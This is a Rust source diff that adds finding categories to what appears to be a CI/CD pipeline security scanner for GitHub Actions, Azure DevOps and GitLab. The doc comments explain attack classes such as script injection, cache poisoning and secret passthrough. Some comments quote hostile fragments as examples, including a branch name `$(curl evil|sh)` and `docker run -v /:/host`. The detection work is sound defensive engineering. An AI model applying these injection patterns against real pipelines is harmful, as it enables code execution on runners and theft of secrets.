@@ -210,6 +210,155 @@ pub enum FindingCategory {
     /// it to protected branches. Deploy job runs (or attempts to run) on
     /// every pipeline trigger.
     GitlabDeployJobMissingProtectedBranchOnly,
+    /// Two-step ADO chain: an inline script captures a `terraform output`
+    /// value (literal `terraform output` CLI invocation or a `$env:TF_OUT_*` /
+    /// `$TF_OUT_*` env var sourced from a Terraform CLI task) AND emits a
+    /// `##vso[task.setvariable variable=X;...]` directive setting that
+    /// captured value into pipeline variable `X`. A subsequent step in the
+    /// same job then expands `$(X)` in shell-expansion position
+    /// (`bash -c "..."`, `eval`, command substitution `$(...)`, PowerShell
+    /// `-split` / `Invoke-Command` / `Invoke-Expression`/`iex`, or as an
+    /// unquoted command word). The `task.setvariable` hop launders
+    /// attacker-controlled Terraform state — sourced from a remote backend
+    /// (S3 bucket, Azure Storage) that often has weaker access controls than
+    /// the pipeline itself — through pipeline-variable space and into a
+    /// shell interpreter.
+    TerraformOutputViaSetvariableShellExpansion,
+    /// GHA workflow declares a high-blast-radius trigger (`issue_comment`,
+    /// `pull_request_review`, `pull_request_review_comment`, `workflow_run`)
+    /// alongside write permissions or non-`GITHUB_TOKEN` secrets. Closes the
+    /// gap left by `trigger_context_mismatch` only firing on
+    /// `pull_request_target` / ADO `pr`.
+    RiskyTriggerWithAuthority,
+    /// A `jobs.<id>.outputs.<name>` value is sourced from `secrets.*`, an
+    /// OIDC-bearing step output, or has a credential-shaped name. Job outputs
+    /// flow unmasked through `needs.<job>.outputs.*` and are written to the
+    /// run log — masking is heuristic, never authoritative.
+    SensitiveValueInJobOutput,
+    /// A `workflow_dispatch.inputs.*` value flows into `curl` / `wget` /
+    /// `gh api` / a `run:` URL / `actions/checkout` `ref:`. Anyone with
+    /// dispatch permission can pivot the run to attacker-controlled refs or
+    /// hosts.
+    ManualDispatchInputToUrlOrCommand,
+    /// A reusable workflow call uses `secrets: inherit` while the caller is
+    /// triggered by an attacker-influenced event (`pull_request`,
+    /// `pull_request_target`, `issue_comment`, `workflow_run`). The whole
+    /// caller secret bag forwards to the callee regardless of what the callee
+    /// actually consumes — every transitive `uses:` in the called workflow
+    /// inherits the same scope.
+    SecretsInheritOverscopedPassthrough,
+    /// A `workflow_run`- or `pull_request_target`-triggered consumer
+    /// downloads an artifact from the originating run AND interprets that
+    /// artifact's content into a privileged sink (post-to-comment, write to
+    /// `$GITHUB_ENV`, `eval`, …). The producer ran in PR context, so a
+    /// malicious PR can write arbitrary content into the artifact while the
+    /// consumer holds upstream-repo authority.
+    UnsafePrArtifactInWorkflowRunConsumer,
+    /// A GitHub Actions `run:` block (or `actions/github-script` `script:` body)
+    /// interpolates an attacker-controllable expression — `${{ github.event.* }}`,
+    /// `${{ github.head_ref }}`, or `${{ inputs.* }}` from a privileged trigger
+    /// (`workflow_dispatch` / `workflow_run` / `issue_comment`) — directly into
+    /// the script text without first binding through an `env:` indirection.
+    /// Classic GitHub Actions remote-code-execution pattern.
+    ScriptInjectionViaUntrustedContext,
+    /// A workflow that holds non-`GITHUB_TOKEN` secrets or non-default
+    /// write permissions includes a step that uses an interactive debug action
+    /// (mxschmitt/action-tmate, lhotari/action-upterm, actions/tmate, …).
+    /// A maintainer flipping `debug_enabled=true` publishes the runner's full
+    /// environment over an external SSH endpoint.
+    InteractiveDebugActionInAuthorityWorkflow,
+    /// An `actions/cache` step keys the cache on a PR-derived expression
+    /// (`github.head_ref`, `github.event.pull_request.head.ref`, `github.actor`)
+    /// in a workflow that ALSO runs on `push: branches: [main]` — a PR can
+    /// poison the cache that the default-branch build later restores.
+    PrSpecificCacheKeyInDefaultBranchConsumer,
+    /// A `run:` step uses `gh ` / `gh api` with the default `GITHUB_TOKEN` to
+    /// perform a write-class action (`pr merge`, `release create/upload`,
+    /// `api -X POST/PATCH/PUT/DELETE` to `/repos/.../{contents,releases,actions/secrets,environments}`)
+    /// inside a workflow triggered by `pull_request`, `issue_comment`, or
+    /// `workflow_run` — runtime privilege escalation that static permission
+    /// checks miss.
+    GhCliWithDefaultTokenEscalating,
+    /// GitLab CI `$CI_JOB_TOKEN` (or `gitlab-ci-token:$CI_JOB_TOKEN`) used as a
+    /// bearer credential against an external HTTP API or fed to `docker login`
+    /// for `registry.gitlab.com`. CI_JOB_TOKEN's default scope (registry write,
+    /// package upload, project read) means a poisoned MR job that emits the
+    /// token to a webhook can pivot to package/registry pushes elsewhere.
+    CiJobTokenToExternalApi,
+    /// GitLab CI `id_tokens:` declares an `aud:` audience that is reused across
+    /// MR-context and protected-context jobs (no audience separation), or is a
+    /// wildcard / multi-cloud broker URL. The audience is what trades for
+    /// downstream cloud creds — a single shared `aud` means any job that
+    /// compromises the token assumes the most-privileged role any other job
+    /// uses.
+    IdTokenAudienceOverscoped,
+    /// Direct shell interpolation of attacker-controlled GitLab predefined
+    /// vars (`$CI_COMMIT_BRANCH`, `$CI_COMMIT_REF_NAME`, `$CI_COMMIT_TAG`,
+    /// `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_MERGE_REQUEST_TITLE`,
+    /// `$CI_MERGE_REQUEST_DESCRIPTION`,
+    /// `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `$CI_COMMIT_AUTHOR`) into
+    /// `script:` / `before_script:` / `after_script:` / `environment:url:`
+    /// without single-quote isolation. A branch named `` $(curl evil|sh) ``
+    /// executes inside the runner. GitLab generalisation of the GHA
+    /// `script_injection_via_untrusted_context` class.
+    UntrustedCiVarInShellInterpolation,
+    /// A GitLab `include:` references (a) a `remote:` URL pointing at a
+    /// branch (`/-/raw/<branch>/...`), (b) a `project:` with `ref:` resolving
+    /// to a mutable branch name (main/master/develop), or (c) an include with
+    /// no `ref:` at all (defaults to HEAD). Whoever owns that branch can
+    /// backdoor every consumer's pipeline silently — included YAML executes
+    /// with the consumer's secrets and CI_JOB_TOKEN.
+    UnpinnedIncludeRemoteOrBranchRef,
+    /// A GitLab job declares a `services: [docker:*-dind]` sidecar AND holds
+    /// at least one non-CI_JOB_TOKEN secret (registry creds, deploy keys,
+    /// signing keys, vault id_tokens). docker-in-docker exposes the full
+    /// Docker socket inside the job container — a malicious build step can
+    /// `docker run -v /:/host` from inside dind and read the runner host
+    /// filesystem (other jobs' artifacts, cached creds).
+    DindServiceGrantsHostAuthority,
+    /// A GitLab job whose name or `extends:` matches scanner patterns
+    /// (`sast`, `dast`, `secret_detection`, `dependency_scanning`,
+    /// `container_scanning`, `gitleaks`, `trivy`, `grype`, `semgrep`, etc.)
+    /// runs with `allow_failure: true` AND has no `rules:` clause that
+    /// surfaces the failure. The pipeline goes green even when the scan
+    /// errors out — silent-pass is worse than no scan because reviewers trust
+    /// the badge.
+    SecurityJobSilentlySkipped,
+    /// A GitLab `trigger:` job (downstream / child pipeline) runs in
+    /// `merge_request_event` context OR uses `include: artifact:` from a
+    /// previous job (dynamic child pipeline). Dynamic child pipelines are a
+    /// code-injection sink — anything the build step writes to the artifact
+    /// runs as a real pipeline with the parent project's secrets.
+    ChildPipelineTriggerInheritsAuthority,
+    /// A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME`
+    /// only, or `$CI_COMMIT_REF_SLUG` without a `policy: pull` restriction.
+    /// Caches are stored per-runner keyed by `key:`; a poisoned MR can push a
+    /// malicious `node_modules/` cache that the next default-branch job
+    /// downloads and executes during `npm install`.
+    CacheKeyCrossesTrustBoundary,
+    /// A CI script constructs an HTTPS git URL with embedded credentials
+    /// (`https://user:$TOKEN@host/...`) before invoking `git clone`,
+    /// `git push`, or `git remote set-url`. The credential is exposed
+    /// in the process argv (visible to `ps`, `/proc/*/cmdline`), persists
+    /// in `.git/config` for the rest of the job, and may be uploaded as
+    /// part of any artifact that bundles the workspace.
+    PatEmbeddedInGitRemoteUrl,
+    /// A CI job triggers a different project's pipeline via the GitLab
+    /// REST API using `CI_JOB_TOKEN` and forwards user-influenced variables
+    /// through the `variables[KEY]=value` query/form parameter. The
+    /// downstream project's security depends on the trust contract between
+    /// the two projects — variable values flowing across that boundary
+    /// constitute a cross-project authority bridge.
+    CiTokenTriggersDownstreamWithVariablePassthrough,
+    /// A GitLab job emits an `artifacts.reports.dotenv: <file>` artifact
+    /// whose contents become pipeline variables for any consumer linked
+    /// via `needs:` or `dependencies:`. A consumer in a later stage that
+    /// targets a production-named environment inherits those variables
+    /// transparently — no explicit download is visible at the job level.
+    /// When the producer reads attacker-influenced inputs (branch names,
+    /// commit messages), the dotenv flow is a covert privilege escalation
+    /// channel into the deployment job.
+    DotenvArtifactFlowsToPrivilegedDeployment,
     // Reserved — requires ADO/GH API enrichment beyond pipeline YAML
     /// Requires runtime network telemetry or policy enrichment — not detectable from YAML alone.
     #[doc(hidden)]
